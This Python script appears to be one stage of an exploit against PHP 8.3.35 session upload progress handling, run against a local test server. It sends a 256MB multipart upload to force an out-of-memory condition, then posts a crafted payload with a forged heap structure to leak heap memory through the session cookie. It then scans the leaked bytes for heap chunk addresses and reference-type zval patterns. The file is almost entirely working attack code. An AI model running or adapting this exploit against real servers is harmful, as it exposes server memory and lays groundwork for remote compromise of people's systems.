"""Find the reference pattern in the 8.3.35 heap leak."""
import sys, os, struct, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18112/"
t = E.Target(URL, timeout=180.0, verbose=False)

# Stage 1: OOM trigger with 256MB
print("[*] Stage 1: OOM trigger (256MB)...", flush=True)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})
r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
time.sleep(0.5)

# Stage 2: leak
print("[*] Stage 2: leak...", flush=True)
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
raw = E.parse_cookie(r2)
print(f"[*] Cookie: {len(raw)}B", flush=True)

if len(raw) < 100:
    print("[-] Stage 1 failed - no OOM", flush=True)
    sys.exit(1)

# Find chunk base
c = Counter()
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if 0x700000000000 <= v < 0x800000000000:
        c[v & ~0x1FFFFF] += 1
chunk = c.most_common(1)[0][0] if c else 0
print(f"[*] Chunk base: 0x{chunk:x}", flush=True)

# Look for the reference pattern more carefully
# The reference is: rc (4 bytes), typ (4 bytes), val.value (8 bytes)
# rc = 1, typ = 0x1A (IS_REFERENCE)
# So the pattern is: 01 00 00 00  1A 00 00 00  <8 bytes pointer>
print(f"\n[*] Searching for reference pattern (01 00 00 00 1A 00 00 00)...", flush=True)
pattern = struct.pack("<II", 1, 0x1A)
idx = 0
found = 0
while True:
    idx = raw.find(pattern, idx)
    if idx == -1:
        break
    # Check what's at the next 8 bytes (val.value)
    if idx + 16 <= len(raw):
        val = int.from_bytes(raw[idx+8:idx+16], "little")
        print(f"    Found at offset {idx:04x}: rc=1, typ=0x1A, val.value=0x{val:x}", flush=True)
        found += 1
    idx += 1

if found == 0:
    print("    No references found", flush=True)

# Also look for the IS_REFERENCE type (0x1A) more broadly
print(f"\n[*] Looking for 0x1A in the first 1000 bytes...", flush=True)
for i in range(0, min(1000, len(raw)), 4):
    v = struct.unpack_from("<I", raw, i)[0]
    if v == 0x1A:
        print(f"    0x1A at offset {i:04x}: {raw[i:i+16].hex()}", flush=True)

print("\n[*] done", flush=True)
